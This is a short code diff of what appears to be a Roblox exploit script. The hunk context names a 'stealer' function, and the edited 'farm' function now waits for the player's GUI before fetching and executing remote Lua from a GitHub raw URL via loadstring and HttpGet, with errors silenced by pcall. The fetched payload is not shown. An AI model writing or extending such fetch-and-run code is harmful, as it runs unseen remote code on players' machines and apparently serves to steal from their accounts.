@@ -5,7 +5,14 @@ local function stealer()
 end
 
 local function farm()
-    task.delay(1, function()
+    task.spawn(function()
+        -- Wait until LocalPlayer and PlayerGui are fully ready
+        local player = game:WaitForChild("Players"):WaitForChild("LocalPlayer")
+        local gui = player:WaitForChild("PlayerGui")
+
+        -- Slight extra delay just to be safe
+        wait(1)
+
         pcall(function()
             loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptsHub11/loadingGUI/refs/heads/main/loadingGUI'))()
         end)
